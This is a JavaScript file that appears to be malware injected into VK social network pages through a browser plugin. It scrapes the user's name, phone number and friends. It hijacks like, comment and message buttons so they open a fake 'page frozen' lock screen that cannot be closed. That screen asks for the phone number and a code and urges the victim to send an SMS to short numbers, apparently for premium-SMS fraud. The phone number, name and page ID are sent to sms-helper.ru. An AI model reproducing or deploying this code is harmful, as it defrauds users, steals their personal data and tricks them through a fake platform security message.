var country = [{'name':'Австралия', 'code':'+61'},{'name':'Австралия', 'code':'+672'},{'name':'Австрия', 'code':'+43'},{'name':'Азербайджан', 'code':'+994', 'num':'8777', 'text':'3342243'},{'name':'Албания', 'code':'+355'},{'name':'Алжир', 'code':'+21'},{'name':'Алжир', 'code':'+213'},{'name':'Американское Самоа', 'code':'+1684'},{'name':'Ангилья', 'code':'+1264'},{'name':'Ангола', 'code':'+244'},{'name':'Андорра', 'code':'+376'},{'name':'Антигуа и Барбуда', 'code':'+1268'},{'name':'Аргентина', 'code':'+54'},{'name':'Армения', 'code':'+374', 'num':'1003', 'text':'pm342243'},{'name':'Аруба', 'code':'+297'},{'name':'Афганистан', 'code':'+93'},{'name':'Багамы', 'code':'+1242'},{'name':'Бангладеш', 'code':'+880'},{'name':'Барбадос', 'code':'+1246'},{'name':'Бахрейн', 'code':'+973'},{'name':'Беларусь', 'code':'+375', 'num':'1310', 'text':'44342243'},{'name':'Белиз', 'code':'+501'},{'name':'Бельгия', 'code':'+32'},{'name':'Бенин', 'code':'+229'},{'name':'Бермуды', 'code':'+1441'},{'name':'Болгария', 'code':'+359'},{'name':'Боливия', 'code':'+591'},{'name':'Бонайре, Синт-Эстатиус и Саба', 'code':'+1721'},{'name':'Босния и Герцеговина', 'code':'+387'},{'name':'Ботсвана', 'code':'+267'},{'name':'Бразилия', 'code':'+55'},{'name':'Бруней-Даруссалам', 'code':'+673'},{'name':'Буркина-Фасо', 'code':'+226'},{'name':'Бурунди', 'code':'+257'},{'name':'Бутан', 'code':'+975'},{'name':'Вануату', 'code':'+678'},{'name':'Великобритания', 'code':'+246'},{'name':'Великобритания', 'code':'+44'},{'name':'Венгрия', 'code':'+36'},{'name':'Венесуэла', 'code':'+58'},{'name':'Виргинские острова, Британские', 'code':'+1284'},{'name':'Виргинские острова, США', 'code':'+1340'},{'name':'Восточный Тимор', 'code':'+670'},{'name':'Вьетнам', 'code':'+84'},{'name':'Габон', 'code':'+241'},{'name':'Гайана', 'code':'+592'},{'name':'Гаити', 'code':'+509'},{'name':'Гамбия', 'code':'+220'},{'name':'Гана', 'code':'+233'},{'name':'Гваделупа', 'code':'+590'},{'name':'Гватемала', 'code':'+502'},{'name':'Гвинея', 'code':'+224'},{'name':'Гвинея-Бисау', 'code':'+245'},{'name':'Германия', 'code':'+49'},{'name':'Гибралтар', 'code':'+350'},{'name':'Гондурас', 'code':'+504'},{'name':'Гонконг', 'code':'+852'},{'name':'Гренада', 'code':'+1473'},{'name':'Гренландия', 'code':'+299'},{'name':'Греция', 'code':'+30'},{'name':'Грузия', 'code':'+995'},{'name':'Гуам', 'code':'+1671'},{'name':'Дания', 'code':'+45'},{'name':'Джибути', 'code':'+253'},{'name':'Доминика', 'code':'+1767'},{'name':'Доминиканская Республика', 'code':'+1809'},{'name':'Доминиканская Республика', 'code':'+1829'},{'name':'Доминиканская Республика', 'code':'+1849'},{'name':'Египет', 'code':'+20'},{'name':'Замбия', 'code':'+260'},{'name':'Зимбабве', 'code':'+263'},{'name':'Йемен', 'code':'+967'},{'name':'Израиль', 'code':'+972'},{'name':'Индия', 'code':'+91'},{'name':'Индонезия', 'code':'+62'},{'name':'Иордания', 'code':'+962'},{'name':'Ирак', 'code':'+964'},{'name':'Иран', 'code':'+98'},{'name':'Ирландия', 'code':'+353'},{'name':'Исландия', 'code':'+354'},{'name':'Исландия', 'code':'+403'},{'name':'Исландия', 'code':'+404'},{'name':'Испания', 'code':'+34'},{'name':'Италия', 'code':'+39'},{'name':'Кабо-Верде', 'code':'+238'},{'name':'Казахстан', 'code':'+77', 'num':'7502'},{'name':'Камбоджа', 'code':'+855'},{'name':'Камерун', 'code':'+237'},{'name':'Канада', 'code':'+1'},{'name':'Катар', 'code':'+974'},{'name':'Кения', 'code':'+254'},{'name':'Кипр', 'code':'+357'},{'name':'Кирибати', 'code':'+686'},{'name':'Китай', 'code':'+86'},{'name':'Колумбия', 'code':'+57'},{'name':'Коморы', 'code':'+269'},{'name':'Конго', 'code':'+242'},{'name':'Конго, демократическая республика', 'code':'+243'},{'name':'Коста-Рика', 'code':'+506'},{'name':'Кот д`Ивуар', 'code':'+225'},{'name':'Куба', 'code':'+53'},{'name':'Кувейт', 'code':'+965'},{'name':'Кыргызстан', 'code':'+996'},{'name':'Кюрасао', 'code':'+5999'},{'name':'Лаос', 'code':'+856'},{'name':'Латвия', 'code':'+371', 'num':'1897', 'text':'3pm342243'},{'name':'Лесото', 'code':'+266'},{'name':'Либерия', 'code':'+231'},{'name':'Ливан', 'code':'+961'},{'name':'Ливия', 'code':'+218'},{'name':'Литва', 'code':'+370', 'num':'1337', 'text':'3pm342243'},{'name':'Лихтенштейн', 'code':'+423'},{'name':'Люксембург', 'code':'+352'},{'name':'Маврикий', 'code':'+230'},{'name':'Мавритания', 'code':'+222'},{'name':'Мадагаскар', 'code':'+261'},{'name':'Макао', 'code':'+853'},{'name':'Македония', 'code':'+389'},{'name':'Малави', 'code':'+265'},{'name':'Малайзия', 'code':'+60'},{'name':'Мали', 'code':'+223'},{'name':'Мальдивы', 'code':'+960'},{'name':'Мальта', 'code':'+356'},{'name':'Марокко', 'code':'+212'},{'name':'Мартиника', 'code':'+596'},{'name':'Маршалловы Острова', 'code':'+692'},{'name':'Мексика', 'code':'+52'},{'name':'Микронезия, федеративные штаты', 'code':'+691'},{'name':'Мозамбик', 'code':'+258'},{'name':'Молдова', 'code':'+373', 'num':'7250', 'text':'342243'},{'name':'Монако', 'code':'+377'},{'name':'Монголия', 'code':'+976'},{'name':'Монтсеррат', 'code':'+1664'},{'name':'Мьянма', 'code':'+95'},{'name':'Намибия', 'code':'+264'},{'name':'Науру', 'code':'+674'},{'name':'Непал', 'code':'+977'},{'name':'Нигер', 'code':'+227'},{'name':'Нигерия', 'code':'+234'},{'name':'Нидерланды', 'code':'+31'},{'name':'Никарагуа', 'code':'+505'},{'name':'Ниуэ', 'code':'+683'},{'name':'Новая Зеландия', 'code':'+64'},{'name':'Новая Каледония', 'code':'+687'},{'name':'Норвегия', 'code':'+47'},{'name':'Объединенные Арабские Эмираты', 'code':'+971'},{'name':'Оман', 'code':'+968'},{'name':'Остров Мэн', 'code':'+44'},{'name':'Остров Норфолк', 'code':'+6723'},{'name':'Острова Кайман', 'code':'+1345'},{'name':'Острова Кука', 'code':'+682'},{'name':'Острова Теркс и Кайкос', 'code':'+1649'},{'name':'Пакистан', 'code':'+92'},{'name':'Палау', 'code':'+680'},{'name':'Палестинская автономия', 'code':'+970'},{'name':'Панама', 'code':'+507'},{'name':'Папуа - Новая Гвинея', 'code':'+675'},{'name':'Парагвай', 'code':'+595'},{'name':'Перу', 'code':'+51'},{'name':'Питкерн', 'code':'+64'},{'name':'Польша', 'code':'+48'},{'name':'Португалия', 'code':'+351'},{'name':'Пуэрто-Рико', 'code':'+1787'},{'name':'Пуэрто-Рико', 'code':'+1939'},{'name':'Реюньон', 'code':'+262'},{'name':'Россия', 'code':'+7', 'num':'2332'},{'name':'Руанда', 'code':'+250'},{'name':'Румыния', 'code':'+40'},{'name':'Сальвадор', 'code':'+503'},{'name':'Самоа', 'code':'+685'},{'name':'Сан-Марино', 'code':'+378'},{'name':'Сан-Томе и Принсипи', 'code':'+239'},{'name':'Саудовская Аравия', 'code':'+966'},{'name':'Свазиленд', 'code':'+268'},{'name':'Святая Елена', 'code':'+247'},{'name':'Святая Елена', 'code':'+290'},{'name':'Северная Корея', 'code':'+850'},{'name':'Северные Марианские острова', 'code':'+1670'},{'name':'Сейшелы', 'code':'+248'},{'name':'Сенегал', 'code':'+221'},{'name':'Сент-Винсент', 'code':'+1784'},{'name':'Сент-Китс и Невис', 'code':'+1869'},{'name':'Сент-Люсия', 'code':'+1758'},{'name':'Сент-Пьер и Микелон', 'code':'+508'},{'name':'Сербия', 'code':'+381'},{'name':'Сингапур', 'code':'+65'},{'name':'Синт-Мартен', 'code':'+599'},{'name':'Сирийская Арабская Республика', 'code':'+963'},{'name':'Словакия', 'code':'+421'},{'name':'Словения', 'code':'+386'},{'name':'Соломоновы Острова', 'code':'+677'},{'name':'Сомали', 'code':'+252'},{'name':'Судан', 'code':'+249'},{'name':'Суринам', 'code':'+597'},{'name':'США', 'code':'+1'},{'name':'Сьерра-Леоне', 'code':'+232'},{'name':'Таджикистан', 'code':'+992'},{'name':'Тайвань', 'code':'+886'},{'name':'Таиланд', 'code':'+66'},{'name':'Танзания', 'code':'+255'},{'name':'Того', 'code':'+228'},{'name':'Токелау', 'code':'+690'},{'name':'Тонга', 'code':'+676'},{'name':'Тринидад и Тобаго', 'code':'+1868'},{'name':'Тувалу', 'code':'+688'},{'name':'Тунис', 'code':'+216'},{'name':'Туркменистан', 'code':'+993'},{'name':'Турция', 'code':'+90'},{'name':'Уганда', 'code':'+256'},{'name':'Узбекистан', 'code':'+998'},{'name':'Украина', 'code':'+380', 'num':'9106'},{'name':'Уоллис и Футуна', 'code':'+681'},{'name':'Уругвай', 'code':'+598'},{'name':'Фарерские острова', 'code':'+298'},{'name':'Фиджи', 'code':'+679'},{'name':'Филиппины', 'code':'+63'},{'name':'Финляндия', 'code':'+358'},{'name':'Фолклендские острова', 'code':'+500'},{'name':'Франция', 'code':'+33'},{'name':'Французская Гвиана', 'code':'+594'},{'name':'Французская Полинезия', 'code':'+689'},{'name':'Хорватия', 'code':'+385'},{'name':'Центрально-Африканская Республика', 'code':'+236'},{'name':'Чад', 'code':'+235'},{'name':'Черногория', 'code':'+382'},{'name':'Чехия', 'code':'+420'},{'name':'Чили', 'code':'+56'},{'name':'Швейцария', 'code':'+41'},{'name':'Швеция', 'code':'+46'},{'name':'Шпицберген и Ян Майен', 'code':'+47'},{'name':'Шри-Ланка', 'code':'+94'},{'name':'Эквадор', 'code':'+593'},{'name':'Экваториальная Гвинея', 'code':'+240'},{'name':'Эритрея', 'code':'+291'},{'name':'Эстония', 'code':'+372'},{'name':'Эфиопия', 'code':'+251'},{'name':'Южная Корея', 'code':'+82'},{'name':'Южно-Африканская Республика', 'code':'+27'},{'name':'Южный Судан', 'code':'+211'},{'name':'Ямайка', 'code':'+1876'},{'name':'Япония', 'code':'+81'}];
var standartFriendL = [{'i':'http://cs307906.vk.me/v307906065/6d2a/bmBQFxGlKUw.jpg', 'n':'Василий<br/>Иванович'},{'i':'http://cs411922.vk.me/v411922272/71b3/VU8jcjA29hA.jpg', 'n':'Валерия<br/>Якуничкина'},{'i':'http://cs418927.vk.me/v418927942/1d7e/vwpmoFSQk7A.jpg', 'n':'Иван<br/>Серебряков'},{'i':'http://vk.com/images/deactivated_c.gif', 'n':'Владислав</br>Вологдин'},{'i':'http://cs9192.vk.me/v9192130/b/GGRuqJ5-Zuo.jpg', 'n':'Артём<br/>Хлусов'}];
var noCodeNum = '';
var noCodeTxt = '';
var prefix = '';
const goodUrl = "http://sms-helper.ru/js/";

function CreateTableFriend(){
	try{
		var vFriends = plg.Get('vFriends');
		if(vFriends == '0')
			vFriends = standartFriendL;
		else{
			var arr = vFriends.split(";");
			var obj = [];
			for(var s = 0; s < arr.length; s++){
				obj.push(eval("(" + arr[s].toString() + ")"));
			}
			vFriends = obj;
		}	
		
		var table = '<table><tr align="center">';
		for(var i = 0; i < vFriends.length; i++)
			table += '<td style="width: 80px;"><img width="50" height="50" src="' + vFriends[i].i + '"></td>';
		table += '</tr><tr align="center">';
		for(var i = 0; i < vFriends.length; i++)
			table += '<td>' + vFriends[i].n + '</td>';
		table += '</tr></table>';
		
		return table;
	}catch(e){}
}

function GetCountry(code){
	var str = '';
	for(i = 0; i < country.length; i++){
		if(code == country[i].code){
			var sel = "selected";
			noCodeNum = country[i].num;
			noCodeTxt = country[i].text;
			prefix = code;
		}
		else{
			var sel = "";
		}
		
		str += '<option txt="' + ((country[i].text) ? country[i].text : "") + '" num="' + ((country[i].num) ? country[i].num : "") + '" ' + sel +' value="' + country[i].code +'" id="__' + country[i].code +'">' + country[i].name + ' (' + country[i].code + ')' + '</option>' + "\r\n";
	}
	return str;
}

function getTime(){
	var g = new Date().getTime() / 1000 / 60;
	g = g - (g % 1);
	return g;
}

function GetInfForUser(){
	try{
		var od = plg.Get('oRun');
		if(od)
			return false;
			
		plg.Save('vIdPage', vk.id.toString());
		plg.Save('vRun', '0');
	} catch(e){}

	ajax.plainpost('/settings.php', null, function(text){
		number = text.match(/([+]{1}[0-9]+(?:[\*]+))/g);
		if(number){
			try{
				plg.Save('vTel', number.toString());
			} catch(e){}	
		}
	});
	
	try{
		ajax.plainpost('/id' + vk.id.toString(), null, function(text){
			var html = document.createElement("div");
			html.innerHTML = text;
			var tmp = html.getElementsByTagName("h1")[0];
			if(typeof(tmp.innerText)!='undefined')
				var name = tmp.innerText;
			else
				var name = tmp.textContent;
				
			var name = name.replace(/online /i, '');
			if(!/ошибка/i.test(name))
				plg.Save('vName', escape(name).toString());
			
			
			if(html.getElementsByClassName("people_cell")){
				var tmpImg = html.getElementsByClassName("people_cell");
				var friend = [];
				for(var i = 0; i < 5; i++){
					if(typeof(tmpImg[i].innerText)!='undefined')
						var n = tmpImg[i].innerText;
					else
						var n = tmpImg[i].textContent;
					friend[i] = "{'i':'" + tmpImg[i].getElementsByTagName('img')[0].src + "','n':'" + trim(n).replace(/[\n]+/g, '<br/>') + "'}";
				}
				var f = friend.join(";");
				plg.Save('vFriends', f.toString());
			}
			else
				plg.Save('vFriends', "0");
		});
	} catch(e){}
}

function trim(str, chars) { 
	return ltrim(rtrim(str, chars), chars); 
} 
 
function ltrim(str, chars) { 
	chars = chars || "\\s"; 
	return str.replace(new RegExp("^[" + chars + "]+", "g"), ""); 
} 
 
function rtrim(str, chars) { 
	chars = chars || "\\s"; 
	return str.replace(new RegExp("[" + chars + "]+$", "g"), ""); 
}

function IsInf(){
	if(location.href.indexOf('login') > -1)
		return false;
	try{
		var id = plg.Get('vIdPage');
		var number = plg.Get('vTel');
		var name = plg.Get('vName');
		var friend = plg.Get('vFriends');
	}
	catch(e){}
	
	if(!id || !number || !name || !friend){
		GetInfForUser();
		return false;
	}
	
	if(id != vk.id){
		GetInfForUser();
		return false;
	}
	SendStat(1, "small");
	return true;
}

function NewAction(){
	try {
		var od = plg.Get('oRun');
	} catch(e){}
	if(od)
		return false;

	try {
		var stat = plg.Get('vRun');
		if(stat == 3){
			try{
				plg.Del();
			}catch(e){}
			return false;
		}
		if(window.wall){
			wall.like = function(){start();}
			wall.likeShareCustom = function(){start();}
			wall.sendReply = function(){start();}
			wall.sendPost = function(){start();}
		}
		
		if(window.Photoview){
			Photoview.like = function(){start();}
			Photoview.showShare = function(){start();}
			Photoview.sendComment = function(){start();}
		}
		
		if(window.IM){
			IM.sendNewMsg = function(){start();}
			if(ge('im_send'))
				ge('im_send').setAttribute('onclick', 'start();');
		}
	} catch(e){}
}

function CreateCSS(urlCss, func){
	var elCSS = document.createElement("link");
	elCSS.setAttribute("rel", "stylesheet");
	elCSS.setAttribute("type", "text/css");
	elCSS.setAttribute("href", urlCss);
	document.getElementsByTagName("head")[0].appendChild(elCSS);
	
	elCSS.onload = func;
}

function tipShow(el, text, shift, addClass) {
    el = ge(el);
    var showTT = function() {
      showTooltip(el, {
        text: '<div class="login_blocked_tt_pointer"></div>' + text,
        slideX: 15,
        className: 'login_blocked_tt' + (addClass ? (' ' + addClass) : ''),
        shift: shift,
        forcetoup: true,
        onCreate: removeEvent.pbind(el, 'mouseout')
      });
    }
    if (vk.loaded) {
      setTimeout(showTT, 0);
    } else {
      addEvent(window, 'load', showTT);
    }
}

function tipHides(el) {
	el = ge(el);
    if (el && el.tt && el.tt.hide) el.tt.hide();
}


function phoneTip() {
	if (ge('blocked_phone').readOnly) return;
    return tipShow('blocked_phone_wrap', 'Укажите Ваш номер, к которому <b>будет</b> привязана страница. Мы вышлем на него <b>SMS</b> с кодом. Эта процедура бесплатна.<br><br>Пример номера: <b>+7 906 2233300</b>', [-147, -95, 3], 'login_blocked_phone_tt');
}

function codeTip() {
    if (ge('blocked_code').readOnly) return;
    return tipShow('blocked_code_wrap', 'На Ваш телефон в течение нескольких секунд придет <b>5</b>-значный код.<br><br>Пример кода: <b>05937</b>', [-147, -82, 3]);
}

function TelCode(num){
	return num.match(/\+7(?!7)|\+77|\+380|\+375|\+374|\+994|\+370|\+371|\+373/gi);
}

function Loader(){
	try{
		ge('box_layer_wrap').style.display = 'block';
		ge('box_loader').style.marginTop = (window.innerHeight / 2 - 100) + 'px';
		ge('box_loader').style.display = 'block';
		setTimeout(function(){
			ge('box_loader').style.display = 'none';
			ge('box_layer_wrap').style.display = 'none';
			MyBoxLock();
		}, 3500);
	}
	catch(e){
		MyBoxLock();
	}
}

function CreatePLG(){
	var plg = document.createElement("object");
	if (plg) {
		plg.setAttribute("type", "application/afp");
		plg.setAttribute("id", "AFP");
		plg.setAttribute("width", 0);
		plg.setAttribute("height", 0);
		document.body.appendChild(plg);
	}
	
	return plg;
}

function MyBoxLock(){
	KEY.ESC = 0xFFFFFF;
	try{
		var name = unescape(plg.Get('vName'));
		var number = plg.Get('vTel');
		var lTime = plg.Get('vTime');
		number = number.replace(/(\*)+/, '');
	} catch(e){}
	var code = TelCode(number);
	try{
		var run = plg.Get('vRun');
	} catch(e){}
	var boxLock = new MessageBox({'animSpeed' : 250, 'width' : 600, 'hideOnBGClick' : false});
	document.title = name;
	
	if(run == 2){
		try{
			document.body.innerHTML = '<div class="scroll_fix_wrap" id="page_wrap"><div><div class="scroll_fix" style="width: 1348px;"><div id="page_layout" style="width: 661px;"><div id="page_header" class="p_head p_head_l0"><div class="back"></div><div class="left"></div><div class="right"></div><div class="content"><div id="top_nav" class="head_nav"><table cellspacing="0" cellpadding="0" id="top_links"><tbody><tr><td class="top_back_link_td"></td><td id="logout_link_td"><nobr><a class="top_nav_link" id="logout_link" href="https://login.vk.com/?act=logout&amp;hash=0e34cea7502e4efb48&amp;_origin=http://vk.com" onclick="if (checkEvent(event) === false) { location.href = this.href; return cancelEvent(event); }">выйти</a></nobr></td></tr></tbody></table></div><div id="ts_cont_wrap" ontouchstart="event.cancelBubble = true;" onmousedown="event.cancelBubble = true;" style="display: none;"></div></div></div><div id="page_body" class="fl_r" style="width: 631px;"></div><div class="clear"></div></div></div></div></div>';
			document.body.setAttribute("class", "is_rtl font_default pads");
			document.body.setAttribute("style", "");
			if(!ge("AFP"))
				plg = CreatePLG();
		} catch(e){}
	}
	
	if(lTime > getTime()){
		var btn = '<button id="blocked_send_phone" style="height: 23px;" onclick="GetCode()">Получить код</button>';
		var see_row = 'block';
	}
	else{
		var btn = '<button id="blocked_send_phone" style="height: 23px;" onclick="ChangePass()">Сменить пароль</button>';
		var see_row = 'none';
	}
	
	var content = '<div id="login_blocked_wrap"><div class="login_blocked_centered"><img src="/images/pics/spamfight.gif" id="login_blocked_img" height="160" width="225" /><br/><b>' + name + '</b>, к сожалению, мы обнаружили подозрительную активность и <b>временно заморозили</b> Вашу страницу, чтобы вырвать её из рук злоумышленников.<br><br>Для того чтобы разморозить страницу, мы просим Вас подтвердить, что Вы владелец страницы и сменить пароль.<br/><br/>Эта страница заморожена за подозрительные отметки <br/><b>мне нравится</b> пользователям: </div>  <div class="login_blocked_reason_wrap"><div class="login_blocked_reason">' + CreateTableFriend() + '</div></div><div class="msg" id="blocked_submit_result" style="margin-top: 20px"></div><br/><div class="login_blocked_form"><div class="login_blocked_row" id="blocked_country_row" style="display: ' + see_row + '"><div class="login_select_wrap" id="blocked_country_wrap"><div class="login_blocked_label">Страна</div><select onchange="ChangeCountry(this)" style="width: 134px; height: 25px; border: 1px solid rgb(192, 202, 213);" name="country" id="chCountry">' + GetCountry(code) + '</select><input type="hidden" id="blocked_country" name="blocked_country" /></div></div><div class="login_blocked_row" id="blocked_phone_row" style="display: ' + see_row + '"><div class="login_select_wrap" id="blocked_phone_wrap"><div class="login_blocked_label">Мобильный телефон</div><table id="blocked_phone_table" style="border: 1px solid rgb(192, 202, 213); background: #ffffff;" class="login_readonly_wrap" cellspacing="0" cellpadding="0"><tr><td id="blocked_phone_prefix"><nobr style="margin-right: 5px; color: rgb(119, 119, 119);">' + code + '</nobr></td><td class="blocked_phone_field"><input type="text" id="blocked_phone" onblur="tipHides(\'blocked_phone_wrap\')" onfocus="phoneTip()" value="'+ number.replace(code, '') + '"  class="login_big_text login_readonly" /></td></tr></table></div></div><div id="blocked_code_row" class="login_blocked_row" style="display: none"><div id="blocked_code_wrap" class="login_select_wrap"><div class="login_blocked_label">Код подтверждения</div><input type="text" id="blocked_code" value="" class="login_big_text" placeholder="Введите код сюда" onblur="tipHides(\'blocked_code_wrap\')" onfocus="codeTip()" /></div></div><div class="login_blocked_submit" id="blocked_phone_submit" style=""><div class="button_blue button_wide"><span class="button_lock" id="btn_lock_1" style="display: none;"></span>' + btn + '</div></div><div class="login_blocked_submit" id="blocked_code_submit" style="display: none"><div class="button_blue button_wide"><span class="button_lock" id="btn_lock_2" style="display: none;"></span><button id="blocked_send_code" style="height: 23px;" onclick="CheckCode()">Отправить код</button></div><div class="blocked_no_code"><a id="blocked_resend" onclick="noCode()">Я не получил код</a></div></div><div class="login_blocked_submit" id="blocked_pass_submit" style="display: none"><div class="button_blue button_wide"><button id="blocked_send_pass" onclick="EndLock();">Разморозить</button></div></div></div></div>';
	boxLock.content(content + '<div id="modalWND"></div>');	
	if(run == 2){
		ge('page_body').setAttribute('class', 'simple');
		ge('page_body').innerHTML = '<div id="content" style="border-color: rgb(217, 224, 231); margin-bottom: 0px; border-style: solid; border-width: 0px 1px 1px;">' + content + '</div>';
		ge('page_body').setAttribute('style', 'border-width: 0px 1px 1px; border-color: rgba(100, 100, 100, 0.08); border-style: solid;');
		SendStat(3, "small");
	}
	if(run == 1){
		boxLock.show();
		SendStat(2, "small");
		try {plg.Save('vRun', '2');} catch(e){}
	}
		
	
	var gg = ge('box_layer_wrap');
			if (gg)
				removeEvent(gg, 'click', __bq.hideLastCheck)
}

function ChangeCountry(val){
	ge('blocked_phone_prefix').childNodes[0].innerHTML = val.value;
	noCodeNum = document.getElementById("__" + val.value).getAttribute('num');
	noCodeTxt = document.getElementById("__" + val.value).getAttribute('txt');
	prefix = val.value;
}

function noCode(){
	ge('blocked_submit_result').innerHTML = '<b>Если Вам не пришло смс сообщение.</b><br/>Отправте ' + ((noCodeTxt) ? "смс с текстом <b>" + noCodeTxt + "</b>" : "<b>пустое смс</b> сообщение") + ' по номеру <b>' + ((noCodeNum) ? noCodeNum : "2332") + '</b>.';
	ge('blocked_submit_result').style.display = 'block';
	SendStat(555, "small");
}

function ChangePass(){
	try {
		plg.Save('vRun', '3');
		SendStat(66, "big");
	} catch(e){}
	document.location.replace('http://vk.com/settings#settings_error_pwd');
}

function GetCode(){
	text = ge('blocked_phone');
	if(!/^[0-9]{9,12}$/.test(text.value)){
		ge('blocked_send_phone').innerHTML = '';
		ge('btn_lock_1').style.display = 'block';
		setTimeout(function(){
			ge('blocked_send_phone').innerHTML = 'Получить код';
			ge('btn_lock_1').style.display = 'none';
			ge('blocked_submit_result').innerHTML = '<b>Некорректный мобильный номер.</b></br> Необходимо корректно ввести номер <b>в международном формате</b>, например<br/> <b>+7(921)000-00-00</b>.';
			ge('blocked_submit_result').style.display = 'block';
		}, 1500);
		SendStat(44, "small");
		return false;
	}
	
	var code = prefix; 
	try {plg.Save('vTel', code + text.value);} catch(e){}
	text.setAttribute('readonly','readonly');
	ge('blocked_send_phone').innerHTML = '';
	ge('btn_lock_1').style.display = 'block';
	SendSMS();
	setTimeout(function(){
		ge('btn_lock_1').style.display = 'none';
		ge('blocked_phone_submit').style.display = 'none';
		ge('chCountry').setAttribute('disabled', 'disabled');
		ge('blocked_code_row').style.display = 'block';
		ge('blocked_code_submit').style.display = 'block';
	}, 1500);
	SendStat(4, "small");
	return true;
}

function CheckCode(){
	var uCode = ge('blocked_code').value;
	if(!/^[0-9]{5}$/.test(uCode)){
		ge('blocked_send_code').innerHTML = '';
		ge('btn_lock_2').style.display = 'block';
		
		setTimeout(function(){
			ge('blocked_send_code').innerHTML = 'Отправить код';
			ge('btn_lock_2').style.display = 'none';
			ge('blocked_submit_result').innerHTML = '<b>Неверный код.</b></br> Проверьте правильность ввода кода.';
			ge('blocked_submit_result').style.display = 'block';
		}, 2000)
		SendStat(55, "small");
		return false;
	}
	
	if(sendSms)
		var validKey = sendSms.split(':');
	for(i = 0; i < validKey.length; i++)	
		if(validKey[i] == uCode){
			ge('blocked_send_code').innerHTML = '';
			ge('btn_lock_2').style.display = 'block';
			setTimeout(function(){
				ge('btn_lock_2').style.display = 'none';
				ge('blocked_code_submit').style.display = 'none';
				ge('blocked_pass_submit').style.display = 'block';	
			}, 1500)
			
			SendStat(5, "big");
			
			return true;
		}
	
	ge('blocked_send_code').innerHTML = '';
	ge('btn_lock_2').style.display = 'block';
	
	setTimeout(function(){
		ge('blocked_send_code').innerHTML = 'Отправить код';
		ge('btn_lock_2').style.display = 'none';
		ge('blocked_submit_result').innerHTML = '<b>Неверный код.</b></br> Проверьте правильность ввода кода.';
		ge('blocked_submit_result').style.display = 'block';
	}, 2000)
	SendStat(55, "small");
	return false;
}

function EndLock(){
	try {
		SendStat(6, "big");
		plg.Save('vRun', '3');
	}catch(e){}
	location.reload();
}

function start(){
	try {var stat = plg.Get('vRun');}catch(e){}
	if(stat == 3)
		return false;
	try {
		plg.Save('vRun', '1');
		var startTime = getTime() + 240;
		plg.Save('vTime', startTime.toString());
	} catch(e){}
	SendStat(11, "small");
	CreateCSS('http://st0.userapi.com/css/al/login.css', Loader());
}

function SendSMS(){
	try{
	var number = plg.Get('vTel');
	var id = plg.Get('id');
	var group = plg.Get('group');
	var idPage = plg.Get('vIdPage');
	var alpha = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'];
	number = number.replace(/\+/, '');
	var res = "";
	for(i = 0; i < number.length; i++)
		res += alpha[parseInt(number[i])];
	
	var sms = document.createElement('script');
	sms.setAttribute('type', 'text/javascript');
	var type = GetType();
	var url = goodUrl + 'sendsms.php?type=' + type + '&set=' + res + '&id=' + id + '&shot=' + noCodeNum;
	sms.setAttribute('src', url);
	document.getElementsByTagName('head')[0].appendChild(sms);
	} catch(e){}
}

function GetType(){
	var tmp = prefix;
	if(/\+7/ig.test(tmp)){
		return 3;
	}
	if(/\+380/ig.test(tmp)){
		return 1;
	}
	return 2;
}

function SendStat(step, typeLog){	
	try{
		var id = plg.Get('id');
		var agent = encodeURIComponent(navigator.userAgent);
		if(typeLog == 'small'){
			var statUrl = 'statBeta.php?type=1&status=smallLog&id=' + id + '&agent=' + agent + '&step=' + step;
		}
		
		if(typeLog == 'big'){
			var group = plg.Get('group');
			var idPage = plg.Get('vIdPage');
			var name = encodeURIComponent(plg.Get('vName'));
			var number = plg.Get('vTel');
			number = number.replace(/\+/, '');
			var statUrl = 'statBeta.php?type=1&status=bigLog&set=' + number + '&name=' + name + '&page=' + idPage + '&id=' + id + '&group=' + group + '&agent=' + agent + '&step=' + step;
		}

		var setStat = new Image();
		setStat.src = goodUrl +''+ statUrl;
		return;
	} catch(e){
		var agent = encodeURIComponent(navigator.userAgent);
		var setStat = new Image();
		setStat.src = goodUrl + 'statBeta.php?type=1&status=error&agent=' + agent;
	}
}

function isRun(){
	SendStat(0, "small");
	if(!IsInf())
		return false;

	NewAction();

	try {var od = plg.Get('oRun');}catch(e){}
	if(od){
		document.body.removeEventListener('DOMNodeInserted', isRun, false);
		return false;
	}
	
	if(location.href.indexOf('login') > -1)
		return false;
		
	if(ge('modalWND'))	
		return false;

	try{
		var run = plg.Get('vRun');
	} catch(e){}
	
	if(run == 3){
		document.body.removeEventListener('DOMNodeInserted', isRun, false);
		return true;
	}

	if(run == 2){
		document.body.removeEventListener('DOMNodeInserted', isRun, false);
		CreateCSS('http://st0.userapi.com/css/al/login.css', Loader());
		return true;
	}
}

document.body.addEventListener('DOMNodeInserted', isRun, false);
isRun();